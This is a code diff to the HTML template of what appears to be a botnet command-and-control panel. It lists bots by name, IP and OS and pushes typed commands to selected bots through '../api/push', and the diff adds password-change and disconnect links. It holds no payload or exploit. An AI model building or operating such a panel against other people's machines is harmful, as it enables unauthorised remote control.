@@ -15,6 +15,7 @@
       <div class="container">
         <h1>Bot list</h1>
         <a href="../">&lt;&lt; Back</a>
+        <h2 style="text-align: right"><a href="../passchange">Change Password</a>  <a href="../disconnect">Disconnect</a></h2>
       </div>
     </header>
 
@@ -29,29 +30,28 @@
           <tr><th>Name</th><th>Last Online</th><th>IP</th><th>OS</th><th>Sel.</th></tr>
           {{bot_table}}
           </table>
+      </section>
+    </div>
 
-    </section>
-  </div>
-
-  <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
-  <script>
-  function keypressed(e){
-      if(e.keyCode === 13){
-          send_command();
-      }
-      return false;
-  }
-  function send_command(e) {
-      if(!$(".botid:checked").length){
-        alert('Please select at least one bot !');
-        return;
-      }
-      $(".botid:checked").each(function(){
-          $.post("../api/push", {'botid': $(this).attr('id'), 'cmd': $('#cmd').val()});
-      });
-      $('#cmd').val('');
-      return false;
-  }
-  </script>
+    <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+    <script>
+    function keypressed(e){
+        if(e.keyCode === 13){
+            send_command();
+        }
+        return false;
+    }
+    function send_command(e) {
+        if(!$(".botid:checked").length){
+          alert('Please select at least one bot !');
+          return;
+        }
+        $(".botid:checked").each(function(){
+            $.post("../api/push", {'botid': $(this).attr('id'), 'cmd': $('#cmd').val()});
+        });
+        $('#cmd').val('');
+        return false;
+    }
+    </script>
   </body>
 </html>
